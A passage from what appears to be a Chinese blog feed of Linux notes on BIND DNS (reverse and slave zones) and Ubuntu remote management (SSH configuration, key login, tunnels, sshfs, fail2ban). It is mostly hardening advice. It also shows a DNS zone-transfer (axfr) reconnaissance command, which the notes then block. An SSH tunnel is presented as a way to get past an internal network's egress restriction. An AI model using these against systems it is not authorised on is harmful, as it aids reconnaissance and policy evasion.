class="line">zone <span class="string">"8.1.10.in-addr-arpa"</span>&#123;  <span class="comment"># 反着写,这里一个网段的地址10.1.8就写为8.1.10</span></span><br><span class="line"><span class="built_in">type</span> master;</span><br><span class="line">file <span class="string">"/etc/bind/db.10.1.8"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拷贝一个模板文件</span></span><br><span class="line">sudo cp /etc/<span class="built_in">bind</span>/db.127 /etc/<span class="built_in">bind</span>/db.10.1.8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">sudo systemctl restart bind9</span><br><span class="line">sudo systemctl status bind9</span><br></pre></td></tr></table></figure><p>3.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑反向区域配置文件</span></span><br><span class="line">vim /etc/<span class="built_in">bind</span>/db.10.1.8</span><br><span class="line"><span class="comment"># 文件内容</span></span><br><span class="line">;</span><br><span class="line">; BIND reverse data file <span class="keyword">for</span> <span class="built_in">local</span> loopback interface</span><br><span class="line">;</span><br><span class="line"><span class="variable">$TTL</span>    604800</span><br><span class="line">@   IN  SOA ns.lab.com. root.lab.com. (</span><br><span class="line">                  1     ; Serial</span><br><span class="line">             604800     ; Refresh</span><br><span class="line">              86400     ; Retry</span><br><span class="line">            2419200     ; Expire</span><br><span class="line">              604800 )   ; Negative Cache TTL</span><br><span class="line">;</span><br><span class="line">@   IN  NS  ns.lab.com.   <span class="comment"># 本地的ns记录</span></span><br><span class="line">10   IN  PTR ns.lab.com.   <span class="comment"># PTR 反向指针记录</span></span><br><span class="line">145 INPTRmx1.lab.com <span class="comment">#145即10.1.8.145</span></span><br><span class="line">2 INPTRmx2.lab.com</span><br><span class="line">2 INPTRw3.lab.com<span class="comment"># 一个ip也可以解析为多个域名</span></span><br></pre></td></tr></table></figure><p>4.检测一下反向解析是否正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig -x 10.1.8.2@10.1.8.2</span><br></pre></td></tr></table></figure><h4 id="配置Slave-DNS服务器"><a href="#配置Slave-DNS服务器" class="headerlink" title="配置Slave DNS服务器"></a>配置<code>Slave</code> DNS服务器</h4><ul><li>为例实现冗余容错(防止某台dns服务器宕机)，通常会为每个与安装多个Slave DNS服务器  </li><li>修改记录只能在Master DNS服务器(<code>一个域内只允许有一个</code>)上操作，通过<code>版本号</code>(Serial)通知Slave服务器同步  (所以。作为master的管理员，配置更新之后需要手动修改版本号的值)</li><li>安全考虑<ul><li>服务器全局<code>禁止区域传输</code>（同步本域所有DNS记录）</li><li>只允许指定IP，指定区域的Slave服务器进行区域传输</li><li>区域数据同步使用TCP 53端口</li></ul></li></ul><p>1.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig进行区域传输获取信息  axfr(黑客最喜欢拿的)</span></span><br><span class="line">dig @10.1.8.10 lab.com axfr</span><br><span class="line"></span><br><span class="line"><span class="comment">## 禁止区域传输：</span></span><br><span class="line"><span class="comment"># 全局配置文件   </span></span><br><span class="line"><span class="comment"># sudo vim named.conf.options</span></span><br><span class="line"><span class="comment"># 在option中添加：</span></span><br><span class="line">allow-transfer &#123; none; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用之后，不影响dig来查询某记录，只是拒绝一次性把记录拿走</span></span><br></pre></td></tr></table></figure><p>2.继续修改master服务器配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"><span class="comment"># 在正向/反向zone字段里面都要添加</span></span><br><span class="line">allow-transfer &#123; 10.0.2.54; &#125;;  <span class="comment"># 允许10.0.2.54 -&gt; 就是slave服务器</span></span><br></pre></td></tr></table></figure><p>3.继续修改master服务器配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim /etc/bind/db.lab.com</span></span><br><span class="line"><span class="comment"># 增加一条NS记录和A记录</span></span><br><span class="line">@INNSns2</span><br><span class="line">ns2INA10.1.8.20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑反向的域名解析记录</span></span><br><span class="line"><span class="comment"># vim db.10.1.8</span></span><br><span class="line">20INPTRns2.lab.com.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p>4.安装slave dns服务器并配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/<span class="built_in">bind</span>/named.conf.options</span><br><span class="line"><span class="comment"># 内容</span></span><br><span class="line">acl <span class="string">"local"</span>&#123;   <span class="comment"># </span></span><br><span class="line">10.1.8.0/24；</span><br><span class="line">&#125;； </span><br><span class="line">options &#123;</span><br><span class="line">recursion yes;   </span><br><span class="line">allow-recursion &#123; <span class="built_in">local</span>; &#125;;  </span><br><span class="line">listen-on &#123; 10.0.8.20; &#125;;  <span class="comment"># 侦听自己的</span></span><br><span class="line">allow-transfer &#123; none; &#125;;</span><br><span class="line"></span><br><span class="line">forwarders &#123;</span><br><span class="line">9.9.9.9;  </span><br><span class="line">8.8.8.8;</span><br><span class="line">&#125;;</span><br><span class="line">............</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p>5.slave dns服务器上创建区域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正向zone区域（和master上的对应好）</span></span><br><span class="line">zone <span class="string">"lab.com"</span>&#123;</span><br><span class="line"><span class="built_in">type</span> slave;</span><br><span class="line">file <span class="string">"db.lab.com"</span>;  <span class="comment"># 不能使用绝对路径(区域文件不用手动创建)</span></span><br><span class="line">masters &#123; 10.1.8.10; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 反向区域</span></span><br><span class="line">zone <span class="string">"8.1.10.in-addr.arpa"</span>&#123;</span><br><span class="line"><span class="built_in">type</span> slave;</span><br><span class="line">file <span class="string">"db.lab.com"</span>;  <span class="comment"># 不能使用绝对路径</span></span><br><span class="line">masters &#123; 10.1.8.10; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#区域文件db.lab.com不用手动创建</span></span><br><span class="line"><span class="comment"># 会自动从master上同步下来</span></span><br><span class="line"><span class="comment"># 位置在 /var/cache/bind/   而且文件是加了密的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看slave dns服务器的情况</span></span><br><span class="line">grep <span class="built_in">bind</span> /var/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure><p><strong>记录更新通知</strong><br>Slave服务器到达更新周期<br>客户端数据加密保存（不能直接修改）<br>Master服务器通知版本号</p><p>master服务器的dns配置更新之后，一定要手动修改版本号，然后重启</p><p>在区域配置文件配置（master服务器的dns配置更新之后会通知slave服务器）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"><span class="comment"># 正反向zone都要配置</span></span><br><span class="line">also-notify &#123; 10.1.8.20; &#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS服务&quot;&gt;&lt;a href=&quot;#DNS服务&quot; class=&quot;headerlink&quot; title=&quot;DNS服务&quot;&gt;&lt;/a&gt;DNS服务&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;您是谁家老小&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;域名解析原理&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="DNS" scheme="http://www.xpshuai.cn/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-远程管理</title>
    <link href="http://www.xpshuai.cn/ubuntu%20server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    <id>http://www.xpshuai.cn/ubuntu server-远程管理/</id>
    <published>2020-03-31T05:31:13.000Z</published>
    <updated>2020-05-01T13:37:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七章-远程管理"><a href="#第七章-远程管理" class="headerlink" title="第七章-远程管理"></a>第七章-远程管理</h1><blockquote><p>看我遥控你</p></blockquote><h2 id="远程访问方式"><a href="#远程访问方式" class="headerlink" title="远程访问方式"></a><font color="red">远程访问方式</font></h2><p><strong>为什么要远程管理？</strong><br>服务器大多部署与专门的机房：</p><ul><li>电磁、噪声、氧气、温度湿度等都不适宜人类长期居住</li><li>避免闲杂人等结束业务服务器</li></ul><p><strong>远程管理</strong></p><ul><li>不同的操作系统都支持远程管理技术</li><li>命令行远程管理工具</li><li>图形化远程管理工具</li></ul><h4 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h4><blockquote><p>账号证明就是你</p></blockquote><p>古老的命令行远程管理工具（保底的，建议能不用就不用）</p><ul><li>不安全（明文）</li><li>应尽量避免适用（适用于不支持ssh的环境）</li><li>客户端程序包含在所有系统的默认安装中</li><li>服务端口默认TCP 23</li></ul><p><strong>客户端</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#可以连接任何域名和端口</span></span><br><span class="line">telnet 1.1.1.1 80</span><br><span class="line"></span><br><span class="line"><span class="comment">#和80端口建立socket连接后，可以发送http数据</span></span><br></pre></td></tr></table></figure></p><p><strong>服务器端程序安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install telnetd</span><br><span class="line"></span><br><span class="line">vim /etc/issus.net <span class="comment"># 避免泄露版本信息,</span></span><br><span class="line"><span class="comment">#打开文件，修改tenlet的banner信息（可以修改为一些告知的警告信息:"本公司的服务器,出问题承担法律责任"哈哈）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看服务状态</span></span><br><span class="line">systemctl status inetd.service</span><br></pre></td></tr></table></figure></p><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><blockquote><p>账号证明就是你</p></blockquote><p><strong>服务器安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ubuntu中ssh-server和ssh-client都默认安装了</span></span><br><span class="line">sudo apt install openssh-server  <span class="comment"># openssh是个工具套件(包含了sftp,scp等)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sftp(替代了sftp)  &lt;---&gt;  ftp(明文传输,不太安全)</span></span><br><span class="line"><span class="comment"># scp(替代了rcp)   &lt;---&gt;  rcp(远程拷贝文件,明文传输,不太安全)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看服务状态</span></span><br><span class="line">systemctl status sshd.service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端口默认`22`  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件(ubuntu上来就可以直接使用不用配置)</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#修改配置在这个文件</span></span><br></pre></td></tr></table></figure></p><p>SSH1、SSH2两个版本(版本2更安全)</p><p><strong>配置文件</strong><br><code>vim /etc/ssh/sshd_config</code><br>常用配置项：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Banner /etc/ssh_banner.sh   <span class="comment"># 登录前的banner,指定文件</span></span><br><span class="line">Port  2222<span class="comment"># 修改默认端口(修改后，下次连接会改变端口)</span></span><br><span class="line">PubkeyAuthentication yes<span class="comment"># 开启后使用公钥登录/关闭(no)</span></span><br><span class="line">ListenAddress 12.34.56.78  <span class="comment"># 指定哪块网卡才能侦听22(被ssh连接)</span></span><br><span class="line">PermitRootLoginyes<span class="comment"># 是否允许root远程登录(不过还是建议使用普通账号),建议设置为no是禁止所有方式登录   #prohibit-password是禁用账号密码方式</span></span><br><span class="line">Protocol 2  <span class="comment"># 默认是2.0的协议，可以加一下这条配置，指定只接受2.0版本的连接</span></span><br><span class="line">Allowsers user1 user2<span class="comment"># DenyUsers user3    允许/禁止ssh连接的用户</span></span><br><span class="line">AllowGroup sshusers<span class="comment"># 允许/禁止ssh连接的用户`组`</span></span><br><span class="line">PasswordAuthentication no  <span class="comment"># 禁止使用密码登录(单一密码认证的安全性很低)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更多配置查文档</span></span><br></pre></td></tr></table></figure></p><p><strong>一些零散问题  — SSH工具</strong><br>1.scp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#默认连接22端口，如果修改了就需要指定端口号</span></span><br><span class="line">scp a.txt 192.168.1.10:  <span class="comment"># 拷贝一个文件(默认本地账号与原创系统账号同名，默认目标是主目录)   注意冒号</span></span><br><span class="line">scp a.txt user1@192.168.1.10:/home/b.txt   <span class="comment"># 指定用户名、目标路径</span></span><br><span class="line"></span><br><span class="line">scp -rv <span class="built_in">dirs</span>/ user1@192.168.1.10:   <span class="comment"># 拷贝一个目录， -r递归,-v详细信息</span></span><br><span class="line"></span><br><span class="line">scp user1@192.168.1.10:/tmp/b.txt . <span class="comment"># 拷贝目标服务器的文件到我的机器当前目录上(下载)</span></span><br></pre></td></tr></table></figure></p><p>2.SFTP（ssh和ftp的组合）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录</span></span><br><span class="line">sftp xps@192.168.1.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line">get a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line">put</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一些命令：help, ls, cd, get, wget, put, mput</span></span><br><span class="line"><span class="comment"># 退出 quit   exit</span></span><br></pre></td></tr></table></figure></p><p><strong>ssh公钥登录</strong><br>非对称算法（公钥算法）</p><ul><li>公钥</li><li>私钥<br>公钥加密，私钥解密；私钥加密，公钥解密</li></ul><p>生成秘钥对<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.在我的机器(客户端)产生一对， 选择rsa算法，秘钥长度选择4096</span></span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改...</span></span><br><span class="line"><span class="comment"># 命名秘钥对</span></span><br><span class="line">ssh-keygen -t rsa -b 4096 -f id_mail</span><br><span class="line"><span class="comment"># 修改私钥密码文(这个密码要设置更加安全一点) -p， -f指定修改哪个key的</span></span><br><span class="line">ssh-keygen -p -f ~/.ssh/id_rsa    <span class="comment"># 有多个的话，-f指定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.设置公私钥保存的位置，和打开的密码</span></span><br><span class="line"><span class="comment"># 存放在下面两个文件</span></span><br><span class="line">~/.ssh/id_rsa  <span class="comment"># 私钥</span></span><br><span class="line">~/.ssh/id_rsa.pub  <span class="comment"># 公钥</span></span><br><span class="line"><span class="comment">#ps：know_hosts是连接过的主机</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.把公钥文件--&gt;传送到目标服务器上(服务器上会变成.ssh/authorized_key)</span></span><br><span class="line">ssh-copy-id  xps@192.168.0.10  <span class="comment">#如果有多个，-i选择公钥</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 建议设本地私钥文件权限</span></span><br><span class="line">chmod 400 .ssh/id_rsa</span><br><span class="line"><span class="comment"># 5.服务端公钥权限也要修改</span></span><br><span class="line">.ssh/authorized_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.现在可放心登录了(现在输入的密码是对私钥加密的密码)</span></span><br><span class="line">ssh xps@192.168.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note：记得配置文件修改为禁止使用ssh密码登录,使用公钥登录：</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span>私钥千万不能泄露哦</span></span><br></pre></td></tr></table></figure></p><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a><font color="red">SSH隧道</font></h2><p>通过ssh隧道，封装一些其他的服务数据，保证安全性</p><p><strong>登录</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh xps@192.168.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录之后，不进入shell界面（只是获得会话后运行一个命令，但效果是一样的） -- 命令服务端去ping另外一台机器</span></span><br><span class="line"><span class="comment"># -i指定私钥，-p指定端口</span></span><br><span class="line">ssh -i ~/.ssh/id_main ssh xps@192.168.0.10 -p 2222 ping 192.168.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># (cstream -t限制传输速度通信带宽)拷贝文件夹到目标机器（本地打包, 在服务端解包），pv显示带宽占用情况 </span></span><br><span class="line"><span class="comment"># --- 企业用的网络带宽(质量好)比家用的成本很贵</span></span><br><span class="line">tar -cj dir/ | pv |cstream -t 100k | ssh xps@192.168.0.10 <span class="string">'tar -xj'</span></span><br></pre></td></tr></table></figure></p><p><strong>ssh隧道 – 实现远程映射</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### 端口映射（两个机器之间，添加一个加密的管道 来连接）</span></span><br><span class="line"><span class="comment"># 映射远程端口23到本机2001端口</span></span><br><span class="line"><span class="comment">#（-f端口转发,-N不占用命令行窗口, -L侦听本机的端口，localhost理解为隧道，23为目标机器端口，最后是目标机器ip）</span></span><br><span class="line">ssh -fN -L2001:localhost:23 xps@192.168.0.10 </span><br><span class="line"><span class="comment"># 现在，telnet本机的2001端口，就相当于通过机密的隧道来映射到目标的23端口</span></span><br><span class="line"><span class="comment"># 其他类型的服务也可以封装...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 拓展：远程映射</span></span><br><span class="line"><span class="comment"># 隧道的起点：我的机器，隧道的终点：'另外机器'。然后通过'另外机器',访问目标机器(sina)</span></span><br><span class="line"><span class="comment"># 本机的2002端口，通过ssh隧道，映射到'另外机器'(世界上随便一个机器)的ip的80端口，</span></span><br><span class="line"><span class="comment"># 用途：内网特殊的服务器运行访问外网(进行映射)，就能突破对内容不能上网的限制</span></span><br><span class="line"><span class="comment"># 限制：一对一，针对的外网的某一台（提高：一个端口访问外网所有资源，自己找资料）</span></span><br><span class="line">ssh -fN -L2002:123.206.96.26:80 xps@192.168.0.10  </span><br><span class="line"><span class="comment"># 再telnet 127.0.0.1:2002,就是达到了访问123.206.96.26的80端口的目的(最后的ip只是建立隧道,类似中间的一个)</span></span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu server-远程管理/20200330152732562_32379.png" alt></p><p><img src="/ubuntu server-远程管理/20200330154229749_5054.png" alt></p><p><strong>ssh隧道 – 实现文件系统挂载</strong><br>比如，一开机，就自动把远程机器的目录/分区挂载到我本机上，跟访问本地目录一样的效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ssh隧道实现文件系统的挂载</span></span><br><span class="line"><span class="comment"># 第一个ip的要挂载的远程机器，后面的本机目录</span></span><br><span class="line">sshfs xps@192.168.0.10:home/<span class="built_in">test</span>  /mnt/myfiles<span class="comment"># 远程挂载远程机器目录到本地</span></span><br><span class="line"><span class="comment"># 再查看，会发现本地目录多了远程服务器目录的文件（如果网络带宽不够，性能和体验就比较差）</span></span><br><span class="line"><span class="comment"># 在客户端/服务端对文件进行操作，都是可以的</span></span><br><span class="line">umount /mnt/myfiles<span class="comment"># 卸载1</span></span><br><span class="line">fusermount -u /mnt/myfiles    <span class="comment"># 卸载2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置文件使用持久化挂载</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line">user1@192.168.0.10:/path  /mntpotin   fuse,sshfs,rw,noauto,user,_netdev0</span><br><span class="line"><span class="comment"># 目标机器的路径，本机的挂载点</span></span><br></pre></td></tr></table></figure><p><strong>SSH客户端</strong><br>若要管理的服务器的数目众多，对每台服务器做一个方便记忆的<code>标签</code>，简化登录</p><p>在本机(客户端)创建一个客户端配置文件：<code>~/.ssh/config</code><br>内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">host server1  <span class="comment"># 别名随意</span></span><br><span class="line">Hostname 192.168.1.10  <span class="comment"># 对应主机ip，端口，用户名</span></span><br><span class="line">Port 22</span><br><span class="line">User xps</span><br><span class="line"></span><br><span class="line">host db2</span><br><span class="line">Hostname 192.168.1.10</span><br><span class="line">Port 22</span><br><span class="line">User xps</span><br><span class="line"></span><br><span class="line">host mail1</span><br><span class="line">Hostname 192.168.1.10</span><br><span class="line">Port 22</span><br><span class="line">User xps</span><br></pre></td></tr></table></figure></p><p>以后登录的话，直接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接登录别名即可(不仅方便，还隐藏了ip，更加安全)</span></span><br><span class="line">ssh db1</span><br></pre></td></tr></table></figure></p><h2 id="SSH安全"><a href="#SSH安全" class="headerlink" title="SSH安全"></a><font color="red">SSH安全</font></h2><p><strong>SSH防爆破</strong><br>密码爆破防护</p><p>方法：监视：次数太多就禁止该ip访问</p><p>借助<code>fail2ban</code>来实现:<br>fail2ban原理：周期性的检查登录日志，对异常的ip进行屏蔽(调用防火墙实现)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">apt install fail2ban</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认主配置文件，软件更新时被覆盖(`所以一般不会使用它`)   jail --&gt; 监狱</span></span><br><span class="line">/etc/fail2ban/jail.conf</span><br><span class="line"><span class="comment"># 本地配置文件，软件更新不被覆盖，优先级更高（`一般常修改这个文件`） 复制一份：cp jail.conf jail.local</span></span><br><span class="line">/etc/fail2ban/jail.local</span><br><span class="line"><span class="comment">#配置项(一般只需配置几项)</span></span><br><span class="line"><span class="comment">#1.全局的：</span></span><br><span class="line">ignoreip=127.0.0.1/8 19.168.0.10  <span class="comment"># 忽略并不进行监视的地址（受信的ip地址段）</span></span><br><span class="line">bantime=-1   <span class="comment"># 禁用的时间(单位是s)， -1是永远屏蔽</span></span><br><span class="line">findtime=1   <span class="comment"># 查询间隔时间</span></span><br><span class="line">maxretry=5   <span class="comment"># 连着失败输入多少次密码，我就屏蔽你</span></span><br><span class="line"><span 